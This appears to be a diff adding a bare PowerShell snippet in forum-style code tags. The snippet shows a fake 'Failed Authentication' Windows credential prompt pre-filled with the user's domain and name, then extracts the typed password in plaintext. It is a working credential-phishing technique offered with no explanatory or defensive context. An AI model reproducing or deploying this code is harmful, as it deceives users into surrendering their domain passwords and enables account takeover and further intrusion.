@@ -1,0 +1,7 @@
+[code]
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);
+$name = $cred.username;
+$password = $cred.getnetworkcredential().password;
+[/code]
+
+
